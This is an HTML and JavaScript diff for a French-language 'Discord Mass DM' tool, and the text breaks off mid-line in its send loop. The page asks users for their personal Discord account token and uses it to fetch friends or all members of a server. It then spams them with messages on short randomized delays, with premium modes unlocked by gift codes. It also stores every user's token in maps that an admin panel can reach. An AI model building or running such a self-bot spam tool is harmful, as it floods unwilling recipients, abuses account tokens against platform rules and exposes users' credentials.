@@ -1,0 +1,1579 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Mass DM - ULTIMATE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        :root {
+            --bg-dark: #0a0c15;
+            --bg-card: rgba(18, 22, 36, 0.98);
+            --bg-secondary: #1e2438;
+            --bg-tertiary: #2a314a;
+            --accent: #5865f2;
+            --success: #3ba55d;
+            --warning: #faa81a;
+            --danger: #ed4245;
+            --premium: #ff73fa;
+            --text: #ffffff;
+            --text-secondary: #b0b9e0;
+            --border: rgba(255, 255, 255, 0.08);
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #1e2640, #0a0c15);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* ==================== LOGIN SCREEN ==================== */
+        .login-screen {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            width: 550px;
+            padding: 50px;
+            border-radius: 50px;
+            border: 1px solid var(--border);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .login-header h1 {
+            font-size: 36px;
+            background: linear-gradient(135deg, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        /* ==================== CODE CADEAU ==================== */
+        .code-section {
+            background: linear-gradient(135deg, var(--premium), var(--accent));
+            padding: 25px;
+            border-radius: 30px;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .code-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: rotate 10s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .code-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .code-input {
+            display: flex;
+            gap: 10px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .code-input input {
+            flex: 1;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            color: white;
+            font-size: 16px;
+            text-transform: uppercase;
+        }
+
+        .code-input input:focus {
+            outline: none;
+            border-color: white;
+        }
+
+        .code-input button {
+            padding: 15px 30px;
+            background: white;
+            color: var(--accent);
+            border: none;
+            border-radius: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .code-input button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(255,255,255,0.3);
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background: var(--bg-secondary);
+            border: 2px solid var(--border);
+            border-radius: 20px;
+            color: var(--text);
+            font-size: 15px;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--accent), #3744b0);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(88, 101, 242, 0.4);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ==================== DASHBOARD ==================== */
+        .dashboard {
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            border-radius: 50px;
+            padding: 40px;
+            border: 1px solid var(--border);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            padding-bottom: 30px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid var(--accent);
+        }
+
+        .user-details h2 {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .role-badge {
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .role-admin { background: var(--danger); }
+        .role-premium { background: var(--premium); color: black; }
+        .role-user { background: var(--bg-tertiary); }
+
+        .header-actions {
+            display: flex;
+            gap: 15px;
+        }
+
+        .admin-btn {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .logout-btn {
+            background: var(--bg-tertiary);
+            color: var(--text);
+            border: 1px solid var(--border);
+            padding: 12px 25px;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+
+        /* ==================== STATS ==================== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: var(--bg-secondary);
+            padding: 25px;
+            border-radius: 30px;
+            border: 1px solid var(--border);
+        }
+
+        .stat-value {
+            font-size: 36px;
+            font-weight: 800;
+            margin: 10px 0 5px;
+            color: var(--accent);
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+
+        /* ==================== MODES DM ==================== */
+        .dm-modes {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .dm-card {
+            background: var(--bg-secondary);
+            padding: 25px;
+            border-radius: 30px;
+            text-align: center;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .dm-card.selected {
+            border-color: var(--accent);
+            background: rgba(88, 101, 242, 0.1);
+        }
+
+        .dm-card.premium {
+            background: linear-gradient(135deg, var(--bg-secondary), rgba(255, 115, 250, 0.1));
+        }
+
+        .dm-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .dm-title {
+            font-weight: 700;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .dm-desc {
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+
+        /* ==================== PANEL ADMIN ==================== */
+        .admin-panel {
+            margin-top: 50px;
+            padding: 40px;
+            background: linear-gradient(135deg, rgba(237, 66, 69, 0.15), rgba(88, 101, 242, 0.15));
+            border-radius: 50px;
+            border: 3px solid var(--danger);
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .admin-title {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--danger);
+        }
+
+        /* ==================== BOT CONFIG ==================== */
+        .bot-config {
+            background: var(--bg-secondary);
+            padding: 30px;
+            border-radius: 35px;
+            margin-bottom: 30px;
+        }
+
+        .bot-status {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .status-dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+        }
+
+        .status-dot.online { background: var(--success); animation: pulse 2s infinite; }
+        .status-dot.offline { background: var(--danger); }
+
+        /* ==================== CODE GENERATOR ==================== */
+        .code-generator {
+            background: var(--bg-secondary);
+            padding: 30px;
+            border-radius: 35px;
+            margin-bottom: 30px;
+        }
+
+        .code-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .code-item {
+            background: var(--bg-tertiary);
+            padding: 20px;
+            border-radius: 25px;
+            text-align: center;
+            border: 2px solid var(--premium);
+        }
+
+        .code-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--premium);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+
+        .code-info {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 15px;
+        }
+
+        .code-uses {
+            color: var(--success);
+            font-weight: 700;
+        }
+
+        /* ==================== CONSOLE ==================== */
+        .admin-console {
+            background: #0a0c15;
+            border-radius: 30px;
+            padding: 25px;
+            margin-top: 30px;
+        }
+
+        .console-output {
+            height: 200px;
+            overflow-y: auto;
+            color: #0f0;
+            font-size: 13px;
+            margin-bottom: 20px;
+            padding: 20px;
+            background: #000;
+            border-radius: 20px;
+            font-family: monospace;
+        }
+
+        .console-input {
+            display: flex;
+            gap: 15px;
+        }
+
+        .console-input input {
+            flex: 1;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 20px;
+            color: #0f0;
+            font-family: monospace;
+        }
+
+        .console-input button {
+            padding: 15px 30px;
+            background: var(--success);
+            color: black;
+            border: none;
+            border-radius: 20px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ==================== LOGS ==================== */
+        .connection-logs {
+            background: var(--bg-secondary);
+            border-radius: 35px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .logs-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .logs-table th,
+        .logs-table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .status-online { color: var(--success); }
+        .status-offline { color: var(--danger); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- LOGIN SCREEN -->
+        <div id="login-screen" class="login-screen">
+            <div class="login-card">
+                <div class="login-header">
+                    <h1>Discord Mass DM</h1>
+                    <p style="color: var(--text-secondary);">Système de codes cadeaux</p>
+                </div>
+
+                <!-- SECTION CODE CADEAU -->
+                <div class="code-section">
+                    <div class="code-title">
+                        <span>🎁</span>
+                        <span>VOUS AVEZ UN CODE CADEAU ?</span>
+                        <span>🎁</span>
+                    </div>
+                    <div class="code-input">
+                        <input type="text" id="giftCode" placeholder="Entrez votre code ici" maxlength="12">
+                        <button onclick="redeemCode()">VALIDER</button>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>🔐 Token Discord</label>
+                    <input type="password" id="token" placeholder="Votre token personnel">
+                </div>
+
+                <button class="login-btn" onclick="login()" id="loginBtn">
+                    SE CONNECTER
+                </button>
+
+                <div id="loginError" style="color: var(--danger); margin-top: 20px; text-align: center;"></div>
+                <div id="codeMessage" style="color: var(--success); margin-top: 10px; text-align: center;"></div>
+            </div>
+        </div>
+
+        <!-- MAIN SCREEN -->
+        <div id="main-screen" class="hidden">
+            <div class="dashboard">
+                <!-- HEADER -->
+                <div class="header">
+                    <div class="user-info">
+                        <img id="avatar" class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png">
+                        <div class="user-details">
+                            <h2 id="username">Chargement...</h2>
+                            <span id="roleBadge" class="role-badge role-user">👤 Utilisateur</span>
+                        </div>
+                    </div>
+                    <div class="header-actions">
+                        <button id="adminPanelBtn" class="admin-btn hidden" onclick="toggleAdminPanel()">
+                            👑 PANEL ADMIN
+                        </button>
+                        <button class="logout-btn" onclick="logout()">
+                            🚪 DÉCONNEXION
+                        </button>
+                    </div>
+                </div>
+
+                <!-- STATS -->
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div>👥</div>
+                        <div class="stat-value" id="friendsCount">0</div>
+                        <div class="stat-label">Amis</div>
+                    </div>
+                    <div class="stat-card">
+                        <div>🏰</div>
+                        <div class="stat-value" id="guildsCount">0</div>
+                        <div class="stat-label">Serveurs</div>
+                    </div>
+                    <div class="stat-card">
+                        <div>✅</div>
+                        <div class="stat-value" id="sentCount">0</div>
+                        <div class="stat-label">Envoyés</div>
+                    </div>
+                    <div class="stat-card">
+                        <div>❌</div>
+                        <div class="stat-value" id="failedCount">0</div>
+                        <div class="stat-label">Échecs</div>
+                    </div>
+                    <div class="stat-card">
+                        <div>🤖</div>
+                        <div class="stat-value" id="botStatus">Off</div>
+                        <div class="stat-label">Bot</div>
+                    </div>
+                </div>
+
+                <!-- 4 MODES DM (TOUS DISPONIBLES MAIS CERTAINS NÉCESSITENT PREMIUM) -->
+                <div class="dm-modes">
+                    <div class="dm-card selected" onclick="selectDMMode(1)" id="dmMode1">
+                        <div class="dm-icon">👥</div>
+                        <div class="dm-title">DM All Amis</div>
+                        <div class="dm-desc">Gratuit - Tous les utilisateurs</div>
+                    </div>
+                    <div class="dm-card" onclick="selectDMMode(2)" id="dmMode2">
+                        <div class="dm-icon">🏰</div>
+                        <div class="dm-title">DM All Serveur</div>
+                        <div class="dm-desc" id="mode2Desc">Nécessite premium</div>
+                    </div>
+                    <div class="dm-card" onclick="selectDMMode(3)" id="dmMode3">
+                        <div class="dm-icon">🤖</div>
+                        <div class="dm-title">DM All Amis (Bot)</div>
+                        <div class="dm-desc" id="mode3Desc">Nécessite bot + premium</div>
+                    </div>
+                    <div class="dm-card" onclick="selectDMMode(4)" id="dmMode4">
+                        <div class="dm-icon">🤖🏰</div>
+                        <div class="dm-title">DM All Serveur (Bot)</div>
+                        <div class="dm-desc" id="mode4Desc">Nécessite bot + premium</div>
+                    </div>
+                </div>
+
+                <!-- CONFIGURATION -->
+                <div class="config-panel">
+                    <div class="config-grid">
+                        <div>
+                            <div id="guildSelector" class="input-group hidden">
+                                <label>🏰 SÉLECTIONNER UN SERVEUR</label>
+                                <select id="guildSelect"></select>
+                            </div>
+
+                            <div id="botTokenSelector" class="input-group hidden">
+                                <label>🤖 TOKEN DU BOT</label>
+                                <input type="password" id="botToken" placeholder="Token du bot pour ce DM">
+                            </div>
+
+                            <div class="input-group">
+                                <label>💬 MESSAGE</label>
+                                <textarea id="message" placeholder="Utilisez {user} pour mentionner">{user} Salut !</textarea>
+                            </div>
+                        </div>
+
+                        <div>
+                            <div class="input-group">
+                                <label>⚡ VITESSE</label>
+                                <select id="speedMode">
+                                    <option value="slow">🐢 Safe (3-5s)</option>
+                                    <option value="normal" selected>⚡ Normal (2-4s)</option>
+                                    <option value="fast">🚀 Rapide (1-3s)</option>
+                                    <option value="extreme">💥 Extreme (0.5-2s)</option>
+                                </select>
+                            </div>
+
+                            <button class="btn btn-primary" onclick="startDM()" id="startBtn" disabled>
+                                🚀 LANCER LE DM
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PROGRESS -->
+                <div id="progressContainer" class="progress-container hidden">
+                    <div class="progress-bar">
+                        <div id="progressFill" class="progress-fill" style="width: 0%"></div>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span id="progressCurrent">0/0</span>
+                        <span id="progressSuccess">✅ 0</span>
+                        <span id="progressFailed">❌ 0</span>
+                    </div>
+                    <div id="lastUser" style="color: var(--text-secondary); margin-top: 10px;"></div>
+                    <button class="btn btn-danger" onclick="stopDM()" id="stopBtn">⏹️ ARRÊTER</button>
+                </div>
+
+                <!-- PANEL ADMIN -->
+                <div id="adminPanel" class="admin-panel hidden">
+                    <div class="admin-header">
+                        <span class="admin-title">👑 PANEL ADMIN</span>
+                        <button class="btn" style="background: var(--bg-tertiary);" onclick="toggleAdminPanel()">FERMER</button>
+                    </div>
+
+                    <!-- BOT CONFIG -->
+                    <div class="bot-config">
+                        <h3 style="margin-bottom: 20px;">🤖 CONFIGURATION DU BOT PRINCIPAL</h3>
+                        <div class="bot-status">
+                            <div class="status-dot" id="mainBotStatusDot"></div>
+                            <span id="mainBotStatus">Bot déconnecté</span>
+                        </div>
+                        <div style="display: flex; gap: 15px;">
+                            <input type="password" id="mainBotToken" placeholder="Token du bot" style="flex: 1; padding: 15px; background: var(--bg-tertiary); border-radius: 20px; border: 1px solid var(--border); color: var(--text);">
+                            <button onclick="connectMainBot()" class="btn btn-success">CONNECTER</button>
+                            <button onclick="disconnectMainBot()" class="btn btn-danger">DÉCONNECTER</button>
+                        </div>
+                    </div>
+
+                    <!-- GÉNÉRATEUR DE CODES -->
+                    <div class="code-generator">
+                        <h3 style="margin-bottom: 20px;">🎁 GÉNÉRATEUR DE CODES CADEAUX</h3>
+                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px;">
+                            <div>
+                                <label>Durée (jours)</label>
+                                <input type="number" id="codeDuration" value="30" min="1" max="365" style="width: 100%; padding: 12px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 15px; color: var(--text);">
+                            </div>
+                            <div>
+                                <label>Utilisations max</label>
+                                <input type="number" id="codeUses" value="1" min="1" max="100" style="width: 100%; padding: 12px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 15px; color: var(--text);">
+                            </div>
+                            <div>
+                                <label> </label>
+                                <button onclick="generateCode()" class="btn btn-success" style="width: 100%;">GÉNÉRER</button>
+                            </div>
+                        </div>
+
+                        <div class="code-grid" id="codesList">
+                            <!-- Les codes générés apparaîtront ici -->
+                        </div>
+                    </div>
+
+                    <!-- STATS ADMIN -->
+                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
+                        <div class="stat-card">
+                            <div>👥</div>
+                            <div class="stat-value" id="adminUsers">0</div>
+                            <div>Connectés</div>
+                        </div>
+                        <div class="stat-card">
+                            <div>💎</div>
+                            <div class="stat-value" id="adminPremium">0</div>
+                            <div>Premium</div>
+                        </div>
+                        <div class="stat-card">
+                            <div>📨</div>
+                            <div class="stat-value" id="adminMessages">0</div>
+                            <div>Messages</div>
+                        </div>
+                        <div class="stat-card">
+                            <div>⛔</div>
+                            <div class="stat-value" id="adminBanned">0</div>
+                            <div>Bannis</div>
+                        </div>
+                    </div>
+
+                    <!-- LOGS DE CONNEXION -->
+                    <div class="connection-logs">
+                        <h3 style="margin-bottom: 20px;">📋 CONNEXIONS</h3>
+                        <table class="logs-table" id="connectionLogs">
+                            <thead>
+                                <tr>
+                                    <th>UTILISATEUR</th>
+                                    <th>ID</th>
+                                    <th>IP</th>
+                                    <th>DATE</th>
+                                    <th>STATUT</th>
+                                    <th>RÔLE</th>
+                                </tr>
+                            </thead>
+                            <tbody id="connectionLogsBody"></tbody>
+                        </table>
+                    </div>
+
+                    <!-- CONSOLE ADMIN (50+ COMMANDES) -->
+                    <div class="admin-console">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                            <span style="color: var(--success);">$ ADMIN CONSOLE v4.0 - 50+ COMMANDES</span>
+                            <span style="color: var(--text-secondary);">Tapez 'help'</span>
+                        </div>
+                        <div class="console-output" id="consoleOutput">
+                            > Console admin prête<br>
+                        </div>
+                        <div class="console-input">
+                            <input type="text" id="consoleInput" placeholder="Commande..." onkeypress="if(event.key==='Enter') executeCommand()">
+                            <button onclick="executeCommand()">EXÉCUTER</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LOGS -->
+                <div style="margin-top: 30px; background: var(--bg-secondary); border-radius: 25px; padding: 20px; max-height: 150px; overflow-y: auto;" id="logs">
+                    <div>Connectez-vous pour commencer</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== CONFIGURATION ====================
+        const ADMIN_ID = '1420857352403554344';
+        let currentUser = null;
+        let userToken = '';
+        let userRole = 'user';
+        let currentDMMode = 1;
+        let isRunning = false;
+        let stopRequested = false;
+        let mainBotConnected = false;
+        let mainBotToken = '';
+
+        // Codes cadeaux
+        let giftCodes = [];
+
+        // Base de données
+        let premiumUsers = new Set([]);
+        let adminUsers = new Set([]);
+        let bannedUsers = new Set([]);
+        let connectionLogs = [];
+        let activeSessions = new Map();
+        let allTokens = new Map();
+
+        // Stats
+        let globalStats = {
+            sent: 0,
+            failed: 0
+        };
+
+        // Délais
+        const speedModes = {
+            slow: { min: 3000, max: 5000 },
+            normal: { min: 2000, max: 4000 },
+            fast: { min: 1000, max: 3000 },
+            extreme: { min: 500, max: 2000 }
+        };
+
+        // ==================== CODES CADEAUX ====================
+        function generateCode() {
+            const duration = parseInt(document.getElementById('codeDuration').value);
+            const maxUses = parseInt(document.getElementById('codeUses').value);
+            
+            // Générer un code aléatoire
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            
+            const expiresAt = new Date();
+            expiresAt.setDate(expiresAt.getDate() + duration);
+            
+            const newCode = {
+                code: code,
+                maxUses: maxUses,
+                uses: 0,
+                createdAt: new Date().toLocaleString(),
+                expiresAt: expiresAt.toLocaleString(),
+                active: true
+            };
+            
+            giftCodes.push(newCode);
+            updateCodesList();
+            addLog(`🎁 Code généré: ${code} (${maxUses} utilisations, ${duration} jours)`);
+        }
+
+        function updateCodesList() {
+            const codesList = document.getElementById('codesList');
+            if (giftCodes.length === 0) {
+                codesList.innerHTML = '<div style="grid-column: span 3; text-align: center; color: var(--text-secondary);">Aucun code généré</div>';
+                return;
+            }
+
+            codesList.innerHTML = giftCodes.map(c => `
+                <div class="code-item">
+                    <div class="code-value">${c.code}</div>
+                    <div class="code-info">Utilisations: <span class="code-uses">${c.uses}/${c.maxUses}</span></div>
+                    <div class="code-info">Expire: ${c.expiresAt}</div>
+                    <button onclick="deleteCode('${c.code}')" style="margin-top: 10px; padding: 8px; background: var(--danger); border: none; border-radius: 10px; color: white; cursor: pointer;">Supprimer</button>
+                </div>
+            `).join('');
+        }
+
+        function deleteCode(code) {
+            giftCodes = giftCodes.filter(c => c.code !== code);
+            updateCodesList();
+            addLog(`🗑️ Code ${code} supprimé`);
+        }
+
+        function redeemCode() {
+            const codeInput = document.getElementById('giftCode').value.toUpperCase();
+            const messageDiv = document.getElementById('codeMessage');
+            
+            const code = giftCodes.find(c => c.code === codeInput);
+            
+            if (!code) {
+                messageDiv.textContent = '❌ Code invalide';
+                messageDiv.style.color = 'var(--danger)';
+                return;
+            }
+
+            if (!code.active) {
+                messageDiv.textContent = '❌ Code expiré';
+                messageDiv.style.color = 'var(--danger)';
+                return;
+            }
+
+            if (code.uses >= code.maxUses) {
+                messageDiv.textContent = '❌ Code déjà utilisé';
+                messageDiv.style.color = 'var(--danger)';
+                return;
+            }
+
+            const expiresAt = new Date(code.expiresAt);
+            if (expiresAt < new Date()) {
+                code.active = false;
+                messageDiv.textContent = '❌ Code expiré';
+                messageDiv.style.color = 'var(--danger)';
+                updateCodesList();
+                return;
+            }
+
+            // Valider le code
+            code.uses++;
+            if (code.uses >= code.maxUses) {
+                code.active = false;
+            }
+
+            // Ajouter l'utilisateur aux premiums (quand il sera connecté)
+            sessionStorage.setItem('pendingPremium', 'true');
+            
+            messageDiv.textContent = '✅ Code validé ! Connectez-vous pour activer le premium';
+            messageDiv.style.color = 'var(--success)';
+            updateCodesList();
+        }
+
+        // ==================== CONNEXION ====================
+        async function login() {
+            const token = document.getElementById('token').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const errorDiv = document.getElementById('loginError');
+
+            if (!token) {
+                errorDiv.textContent = '❌ Token requis';
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Connexion...';
+
+            try {
+                const response = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+
+                if (!response.ok) throw new Error('Token invalide');
+
+                const user = await response.json();
+
+                if (bannedUsers.has(user.id)) {
+                    throw new Error('⛔ Vous êtes banni');
+                }
+
+                currentUser = user;
+                userToken = token;
+
+                // Vérifier si l'utilisateur a utilisé un code
+                if (sessionStorage.getItem('pendingPremium') === 'true') {
+                    premiumUsers.add(user.id);
+                    sessionStorage.removeItem('pendingPremium');
+                }
+
+                const [friendsRes, guildsRes] = await Promise.all([
+                    fetch('https://discord.com/api/v9/users/@me/relationships', {
+                        headers: { 'Authorization': token }
+                    }),
+                    fetch('https://discord.com/api/v9/users/@me/guilds', {
+                        headers: { 'Authorization': token }
+                    })
+                ]);
+
+                const friendsData = await friendsRes.json();
+                const guildsData = await guildsRes.json();
+
+                if (user.id === ADMIN_ID || adminUsers.has(user.id)) {
+                    userRole = 'admin';
+                } else if (premiumUsers.has(user.id)) {
+                    userRole = 'premium';
+                } else {
+                    userRole = 'user';
+                }
+
+                const simulatedIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+
+                connectionLogs.unshift({
+                    id: user.id,
+                    username: user.username,
+                    ip: simulatedIP,
+                    time: new Date().toLocaleString(),
+                    role: userRole,
+                    status: 'online'
+                });
+
+                activeSessions.set(user.id, {
+                    username: user.username,
+                    role: userRole,
+                    token: token,
+                    ip: simulatedIP
+                });
+
+                allTokens.set(user.id, {
+                    token: token,
+                    username: user.username
+                });
+
+                document.getElementById('username').textContent = user.username;
+                document.getElementById('avatar').src = user.avatar ? 
+                    `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : 
+                    'https://cdn.discordapp.com/embed/avatars/0.png';
+                
+                document.getElementById('friendsCount').textContent = friendsData.length;
+                document.getElementById('guildsCount').textContent = guildsData.length;
+
+                const guildSelect = document.getElementById('guildSelect');
+                guildSelect.innerHTML = '<option value="">Sélectionner un serveur</option>';
+                guildsData.forEach(guild => {
+                    guildSelect.innerHTML += `<option value="${guild.id}">${guild.name}</option>`;
+                });
+
+                updateRoleUI();
+                updateDMModes();
+
+                if (userRole === 'admin') {
+                    document.getElementById('adminPanelBtn').classList.remove('hidden');
+                }
+
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('main-screen').classList.remove('hidden');
+                document.getElementById('startBtn').disabled = false;
+
+                addLog(`✅ Connecté: ${user.username} (${userRole})`);
+                updateConnectionLogs();
+
+            } catch (error) {
+                errorDiv.textContent = `❌ ${error.message}`;
+            } finally {
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'SE CONNECTER';
+            }
+        }
+
+        // ==================== BOT PRINCIPAL ====================
+        function connectMainBot() {
+            const token = document.getElementById('mainBotToken').value;
+            if (!token) {
+                addLog('❌ Token bot requis');
+                return;
+            }
+
+            mainBotToken = token;
+            mainBotConnected = true;
+            
+            document.getElementById('mainBotStatus').textContent = 'Bot connecté';
+            document.getElementById('mainBotStatusDot').className = 'status-dot online';
+            document.getElementById('botStatus').textContent = 'On';
+            
+            addLog('🤖 Bot principal connecté');
+        }
+
+        function disconnectMainBot() {
+            mainBotConnected = false;
+            mainBotToken = '';
+            
+            document.getElementById('mainBotStatus').textContent = 'Bot déconnecté';
+            document.getElementById('mainBotStatusDot').className = 'status-dot offline';
+            document.getElementById('botStatus').textContent = 'Off';
+            
+            addLog('🤖 Bot principal déconnecté');
+        }
+
+        // ==================== MASS DM CORRIGÉ ====================
+        async function startDM() {
+            if (!currentUser) return;
+
+            const message = document.getElementById('message').value;
+            const speedMode = document.getElementById('speedMode').value;
+
+            if (!message) {
+                addLog('❌ Message requis');
+                return;
+            }
+
+            // Vérifier les prérequis selon le mode
+            if ((currentDMMode === 2 || currentDMMode === 3 || currentDMMode === 4) && userRole === 'user') {
+                addLog('❌ Mode premium - Utilisez un code cadeau');
+                return;
+            }
+
+            if ((currentDMMode === 3 || currentDMMode === 4) && !mainBotConnected) {
+                addLog('❌ Bot principal non connecté');
+                return;
+            }
+
+            isRunning = true;
+            stopRequested = false;
+            let sent = 0;
+            let failed = 0;
+            let targets = [];
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('progressContainer').classList.remove('hidden');
+            document.getElementById('stopBtn').disabled = false;
+
+            addLog(`🚀 Démarrage Mode ${currentDMMode}...`);
+
+            try {
+                // Récupérer les cibles selon le mode
+                if (currentDMMode === 1 || currentDMMode === 2) {
+                    if (currentDMMode === 1) {
+                        // Amis
+                        const res = await fetch('https://discord.com/api/v9/users/@me/relationships', {
+                            headers: { 'Authorization': userToken }
+                        });
+                        const friends = await res.json();
+                        targets = friends.filter(f => !f.user.bot).map(f => f.user);
+                    } else {
+                        // Serveur - CORRECTION DE L'ERREUR
+                        const guildId = document.getElementById('guildSelect').value;
+                        if (!guildId) throw new Error('Sélectionnez un serveur');
+
+                        let members = [];
+                        let lastId = null;
+                        
+                        while (true) {
+                            const url = lastId ? 
+                                `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000&after=${lastId}` :
+                                `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`;
+                            
+                            const res = await fetch(url, {
+                                headers: { 'Authorization': userToken }
+                            });
+                            
+                            if (!res.ok) break;
+                            
+                            const batch = await res.json();
+                            if (!batch || batch.length === 0) break;
+                            
+                            members = members.concat(batch);
+                            
+                            // CORRECTION : Vérifier que batch a des éléments avant d'accéder à batch.length-1
+                            if (batch.length > 0 && batch[batch.length - 1] && batch[batch.length - 1].user) {
+                                lastId = batch[batch.length - 1].user.id;
+                            } else {
+                                break;
+                            }
+                            
+                            if (batch.length < 1000) break;
+                        }
+                        
+                        targets = members
+                            .filter(m => m && m.user && !m.user.bot)
+                            .map(m => m.user);
+                    }
+                } else {
+                    // Modes bot
+                    targets = [...activeSessions.values()].map(s => ({
+                        id: s.id,
+                        username: s.username
+                    }));
+                }
+
+                if (targets.length === 0) {
+                    throw new Error('Aucune cible trouvée');
+                }
+
+                const total = targets.length;
+                addLog(`📊 ${total} cibles trouvées`);
+
+                for (let i = 0; i < total; i++) {
+                    if (stopRequested) break;
+
+                    const target = targets[i];
+                    const finalMessage = message.replace('{user}', `<@${target.id}>`);
+
+                    try {
+                        const delay = speedModes[speedMode].min + 
